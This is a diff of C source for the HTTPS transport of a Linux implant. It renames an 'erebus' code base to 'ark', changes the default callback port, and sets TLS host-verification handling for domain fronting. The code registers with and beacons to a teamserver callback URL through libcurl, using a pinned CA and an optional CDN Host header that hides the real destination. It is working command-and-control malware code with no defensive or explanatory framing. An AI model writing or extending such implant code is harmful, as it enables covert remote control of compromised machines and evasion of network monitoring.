@@ -8,9 +8,9 @@
 #include <string.h>
 #include <unistd.h>
 
-#include "erebus/config.h"
-#include "erebus/crypto.h"
-#include "erebus/transport.h"
+#include "ark/config.h"
+#include "ark/crypto.h"
+#include "ark/transport.h"
 
 typedef struct {
     char base_url[512];
@@ -42,10 +42,10 @@ static size_t write_cb(char *ptr, size_t size, size_t nmemb, void *userdata) {
 
 /* Build PEM from base64 DER in config (same as Windows C implant embedding). */
 static char *ca_pem_from_config(void) {
-    if (EREBUS_CA_CERT_PEM[0] == '\0') return NULL;
+    if (ARK_CA_CERT_PEM[0] == '\0') return NULL;
     uint8_t *der = NULL;
     size_t der_len = 0;
-    if (!erebus_b64_decode(EREBUS_CA_CERT_PEM, &der, &der_len) || !der || !der_len)
+    if (!ark_b64_decode(ARK_CA_CERT_PEM, &der, &der_len) || !der || !der_len)
         return NULL;
 
     /* PEM-encode DER */
@@ -84,7 +84,7 @@ static char *ca_pem_from_config(void) {
 
 static int https_post(https_linux_ctx *ctx, const char *path,
     const uint8_t *body, size_t body_len, uint8_t **resp, size_t *resp_len) {
-    if (strncmp(ctx->base_url, "https://", 8) == 0 && EREBUS_CA_CERT_PEM[0] == '\0')
+    if (strncmp(ctx->base_url, "https://", 8) == 0 && ARK_CA_CERT_PEM[0] == '\0')
         return 0;
 
     char url[640];
@@ -125,7 +125,7 @@ static int https_post(https_linux_ctx *ctx, const char *path,
         curl_easy_setopt(curl, CURLOPT_CAINFO_BLOB, &blob);
 #else
         /* Fallback: write temp PEM file */
-        char tmp[] = "/tmp/erebus-ca-XXXXXX";
+        char tmp[] = "/tmp/ark-ca-XXXXXX";
         int fd = mkstemp(tmp);
         if (fd < 0) { free(ca_pem); curl_slist_free_all(hdrs); curl_easy_cleanup(curl); return 0; }
         write(fd, ca_pem, strlen(ca_pem));
@@ -135,7 +135,11 @@ static int https_post(https_linux_ctx *ctx, const char *path,
         curl_easy_setopt(curl, CURLOPT_PRIVATE, strdup(tmp));
 #endif
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L); /* private CA / fronting; pin is CA */
+        /* Pin is the teamserver CA. VERIFYHOST=0 only when domain-fronting (CDN Host). */
+        if (ctx->cdn_host_hdr[0])
+            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+        else
+            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
     }
 
     CURLcode rc = curl_easy_perform(curl);
@@ -161,27 +165,27 @@ static int https_post(https_linux_ctx *ctx, const char *path,
     return 1;
 }
 
-static int https_register(erebus_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
+static int https_register(ark_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
     return https_post((https_linux_ctx *)t->ctx, "/register", req, req_len, resp, resp_len);
 }
 
-static int https_beacon(erebus_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
+static int https_beacon(ark_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
     return https_post((https_linux_ctx *)t->ctx, "/beacon", req, req_len, resp, resp_len);
 }
 
-static void https_destroy(erebus_transport *t) {
+static void https_destroy(ark_transport *t) {
     free(t->ctx);
     free(t);
 }
 
-static const erebus_transport_ops https_ops = {
+static const ark_transport_ops https_ops = {
     https_register,
     https_beacon,
     https_destroy,
     NULL, /* set_session_id: HTTPS does not store session in transport ctx */
 };
 
-static void erebus_curl_global_once(void) {
+static void ark_curl_global_once(void) {
     static int done = 0;
     if (done) return;
     /* Single-threaded implant: simple flag is enough (no pthread dependency). */
@@ -191,14 +195,14 @@ static void erebus_curl_global_once(void) {
     }
 }
 
-int erebus_transport_create_https(erebus_transport **out) {
-    erebus_curl_global_once();
-    erebus_transport *t = (erebus_transport *)calloc(1, sizeof(*t));
+int ark_transport_create_https(ark_transport **out) {
+    ark_curl_global_once();
+    ark_transport *t = (ark_transport *)calloc(1, sizeof(*t));
     https_linux_ctx *ctx = (https_linux_ctx *)calloc(1, sizeof(*ctx));
     if (!t || !ctx) { free(t); free(ctx); return 0; }
 
-    const char *url = EREBUS_CALLBACK_URL;
-    if (!url[0]) url = "https://127.0.0.1:443";
+    const char *url = ARK_CALLBACK_URL;
+    if (!url[0]) url = "https://127.0.0.1:1750";
     /* strip trailing slash */
     size_t n = strlen(url);
     while (n > 0 && url[n - 1] == '/') n--;
@@ -206,8 +210,8 @@ int erebus_transport_create_https(erebus_transport **out) {
     memcpy(ctx->base_url, url, n);
     ctx->base_url[n] = '\0';
 
-    if (EREBUS_CDN_DOMAIN[0])
-        snprintf(ctx->cdn_host_hdr, sizeof(ctx->cdn_host_hdr), "Host: %s", EREBUS_CDN_DOMAIN);
+    if (ARK_CDN_DOMAIN[0])
+        snprintf(ctx->cdn_host_hdr, sizeof(ctx->cdn_host_hdr), "Host: %s", ARK_CDN_DOMAIN);
 
     t->ops = &https_ops;
     t->ctx = ctx;
